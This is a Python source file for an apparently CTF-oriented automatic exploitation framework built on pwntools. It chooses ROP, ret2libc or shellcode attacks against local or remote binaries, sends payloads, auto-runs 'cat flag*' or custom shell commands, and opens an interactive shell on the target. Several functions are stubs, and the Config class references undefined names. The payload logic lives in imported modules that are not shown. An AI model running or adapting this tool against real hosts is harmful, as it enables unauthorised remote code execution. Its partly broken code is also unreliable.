from pwn import *
from ABEModules import ABEModules as ABE
from ABEModules import LogicAngr as LAR
from ABEModules import database as DAT

try:
    from ropper import RopperService
except:
    print("Ropper is needed for Ropchain! manual install or use -init(WIP)")
    pass
helpmsg = " \n Usage: to Work correctly you have to fill out the midroll and postroll(when using ret2libc etc..)\n to ensure that the script gets the correct vulnerable entrypoint!\n -f <filename>\n -core (Use coredumps)\n -vic <ip> <port>\n -ibu <startbufsize>\n -NoDas (No dealarm shell)\n -loc (localonly)\n -fupa <fullPath>\n -h help\n -gen <generator> (ropper(default)/RopGad/ropperService/RopGen)\n -debug (noCore)\n -debugCore (debug with coredump,only local)\n -a <attackType> (rop(default)/ret2libc/SOS(shellcode on stack(WIP!!))\n -libc <path to libc>\n -flag (auto cat flag*)\n -cmd  <shellcommand> (custom shell command to be executed as string) \n -man (manual mid and postroll) \n -dev (enables dev Stuff) \n -init (WIP!!!! do NOT use if you dont know what it does!!!))"


def preroll(rem):  # HowToUse False for remote True for binary
    global config
    if rem or config._ForcedLoc:
        if config._LDPRE:
            pathlib = ELF(config._pathtolibc).path
            envy = {"LD_PRELOAD": pathlib}
            rm = process(config._binny, env=envy)
        else:
            rm = process(config._binny)
    else:
        try:
            rm = remote(config._remIP, config._remPort,timeout=3)
        except:
            try:
                if ui.yesno("Unable to connect! Do you want to run it locally instead?", False):
                    rm = process(config._binny)
                    config._ForcedLoc = True
                else:
                    raise NameError
            except NameError:
                exit(0)
            except:
                print("ERROR IN PREROLL!")
                exit(0)
    return midroll(rm)


def midroll(rm):
    if not config._manual:
        sleep(0.1)  # dont play with the timing
        rm.clean()
        if config._input:
            for x in config._input:
                rm.sendline(x)
                sleep(0.1)  # dont play with the timing
                rm.clean()

    else:  # TODO insert Prepping     <<<<===========================================
        rm.recvuntil("What say you now?")
        rm.sendline("Everything intelligent is so boring.")
        rm.recvuntil("Tell me more.")
    return rm


def postroll(rem):  # TODO there to catch shit that comes back/stuff that needs to be used!
    if not config._manual:
        if config._output:
            while(True):
                try:
                    tmp = rem.recvline(timeout=0.75)
                except:
                    break
                if tmp.strip() not in config._output:
                    rem.unrecv(tmp)
                    break
        else:
            print("postroll!!!!!!!!!!!")
            print(rem.clean())
    else:  # TODO insert postroll           <<<<======================================
        rem.recvuntil("Fascinating.\n")
    return rem


def rolling():                          #====================ROLLING=====================
    config = parseargs()
    AutoAttack(config)
    dump = ABE.init(config)
    if config._dev:
        db = DAT.Database()
        exit(0)


    if not config._manual:
        analize(config)
        attack(config)
        exit(0)
    else:
        attack(config)


def attack(config):
    attackTypes = {"rop": ropattack, "ret2libc": ret2libcattack, "SOS": shellcodeattack}
    func = attackTypes.get(config._attackType)
    func()

def analize(config):
    analTypes = {"angr":angrlize,"stat":statilize}
    func = analTypes.get(config._analType)
    func()

def angrlize():
    lar = LAR.LogicANGR(config)
    pass

def statilize():
    pass

def ropattack():
    global config
    if not config._bufferA:
        buf = ABE.Buff()
        buflen = buf.finder()
    rop = ABE.RoPChain()


def ret2libcattack():
    global config
    lib = ABE.libMe()


def shellcodeattack():
    pass


def SnC(rma, payload):
    globals()
    global config
    if config._debugfinalPayload:
        context.log_level = "debug"
    rma.sendline(payload)
    rm = postroll(rma)
    rm.clean()
    if config._LDPRE:
        if rm.poll() == -11:
            print("YESS")
    if config._shellcmd:
        rm.sendline(config._shellcmd)
    if config._autoCatflag and config._shellcmd is None:
        rm.sendline("cat flag*")
    if config._dealarm and not config._LocalOnly and not config._autoCatflag and config._shellcmd is None:
        dealarm_shell(rm)
    if rm.connected():
        pass
    else:
        raise Exception
    config._logGen.success("Here Comes The Shell!")
    rm.interactive(text.blue("\nABE$>"))
    raise NameError


def debugPayload(rm, payload):
    context.log_level = "debug"
    os.remove("./core")
    rm.sendline(payload)
    sleep(1)
    if config._autoCatflag:
        rm.sendline("cat flag.txt;cat flag")
    if config._dealarm and not config._LocalOnly and not config._autoCatflag:
        dealarm_shell(rm)
    rm.interactive(text.blue("\nABE$>"))
    core = Coredump("./core")
    print(core.registers)


def AutoAttack(config):
    globals()
    if config._AutoAttackType:
        analELF(config)
    else:
        pass


def parseargs():
    globals()
    global config
    config = Config()
    arglist = sys.argv
    argn = len(arglist)
    avargs = {"-f": setFilename, "-core": setCore, "-vic": setVictim, "-ibu": setinitBuff,
              "-loc": setLocalOnly, "-fupa": setFullPath, "-h": help, "-gen": setGen, "-NoDas": setNoDealarm,
              "-debug": setDebug, "-debugCore": setDebugCore, "-a": setAttackType, "-libc": setlibc,
              "-flag": setgetflag, "-init": initToolChains, "-cmd": setShellCmd, "-dev": setDev, "-man":setMan}
    for x in range(argn):
        arg = arglist[x]
        funct = avargs.get(arg, Pass)
        funct(x, config)
    global e
    e = ELF(config._binaryfile)
    config._elf = e
    config.updateDB()
    return config


def setDev(x, config):
    config._dev = True


def setShellCmd(x, config):
    config._shellcmd = sys.argv[x + 1]


def setgetflag(x, config):
    config._autoCatflag = True


def setlibc(x, config):
    config._pathtolibc = sys.argv[x + 1]
    config._manuallibc = True


def setAttackType(x, config):
    config._attackType = sys.argv[x + 1]
    config._AutoAttackType = False


def setDebugCore(x, config):
    config._debugfinalPayloadCore = True


def setDebug(x, config):
    config._debugfinalPayload = True


def setNoDealarm(x, config):
    config._dealarm = False


def setGen(x, config):
    config._generator = sys.argv[x + 1]


def Pass(x, config):
    pass


def help(x, config):
    global helpmsg
    print(str(sys.argv[0]) + helpmsg)
    exit(0)

def setMan(x,config):
    config._manual = True

def setFilename(x, config):
    config._binaryfile = sys.argv[x + 1]


def setCore(x, config):
    config._UseCore = True


def setLocalOnly(x, config):
    config._LocalOnly = True


def setVictim(x, config):
    config._remIP = sys.argv[x + 1]
    config._remPort = int(sys.argv[x + 2])


def setinitBuff(x, config):
    config._payroll = int(sys.argv[x + 1])


def setFullPath(x, config):
    config._binfupa = sys.argv[x + 1]


def analELF(config):
    global e, attackType, analType
    if e.symbols:
        analType = "angr"
        config._analType = "angr"
    else:
        analType = "stat"
        config._analType = "stat"
    if e.execstack and False:  # TODO implement Shellcode on stack
        attackType = "SOS"
        config._attackType = "SOS"
    elif e.statically_linked:
        config._attackType = "rop"
    else:
        config._attackType = "ret2libc"


def initToolChains(x, config):
    if os.path.isdir("./ABEToolChain"):
        pass
    else:
        os.mkdir("ABEToolChain")
    if os.path.isdir("./ABEToolChain/libcdb"):
        pass
    else:
        os.system("git clone https://github.com/niklasb/libc-database.git ./ABEToolChain/libcdb")
        os.system("./ABEToolChain/libcdb/get")
        print("If something fails , run './ABEToolChain/libcdb/get'  ! \n")
        pass
    if os.path.isdir("./ABEToolChain/ropgenerator"):
        pass
    else:
        pass  # TODO ropgenerator ... not needed at this moment
    if os.path.isdir("./ABEToolChain/ropper"):
        pass
    else:
        os.system("pip3 install capstone --user;pip install keystone-engine --user ")
        os.system("git clone https://github.com/sashs/ropper.git ./ABEToolChain/ropper")
        os.system("cd ABEToolChain/ropper ; git submodule init ; git submodule update ; python setup.py install --user")
    exit(0)


class Config:
    _binfupa = "/root/PycharmProjects/SaarSec/speedrun-002"  # HowToUse Full Path to file without "./"#
    _binaryfile = None  # HowToUse Filename#
    _remIP = None  # HowToUse set remote IP as String#
    _remPort = None  # HowToUse set remote Port as int#
    _payroll = 1020  # HowToUse Set Buffer Start Size#
    _UseCore = False
    _LocalOnly = False
    _generator = "ropper"
    _toolpa = "./ABEToolChain/"
    _dealarm = True
    _debugfinalPayload = False
    _debugfinalPayloadCore = False
    _isStatical = True
    _attackType = "rop"
    _AutoAttackType = True
    _pathtolibc = "libc-2.28-debian-10.so"
    _manuallibc = False
    _autoCatflag = False
    _ForcedLoc = False
    _shellcmd = None
    _elf = None
    _logGen = None
    _LDPRE = False
    _input = None
    _output = None
    _bufferA=None
    _dev = False
    _main=None
    _end=None
    _payloadsize=None
    _manual=None
    _analType=None
    db=DAT.Database()
    def updateDB(self):
        if _binaryfile:
            if "/" in _binaryfile:
                key = _binaryfile.split("/")[::-1][0]
            else:
                key = _binaryfile
            if _remIP and _remPort:
                oldip,oldport=db.getTarget(key)
                if oldip == _remIP and oldport == _remPort:
                    pass
                else:
                    db.addTarget(key, _remIP, _remPort)
            else:
                oldip, oldport = db.getTarget(key)
                if oldport:
                    _remIP = oldip
                    _remPort = oldport
        db.update()

    def midroll(self, rm):
        return midroll(rm)

    def postroll(self, rm):
        return postroll(rm)

    def preroll(self, rm):
        return preroll(rm)

    def SnC(self, rm, paylaod):
        SnC(rm, paylaod)

    def debugPayload(self, rm, payload):
        debugPayload(rm, payload)


if __name__ == '__main__':
    rolling()
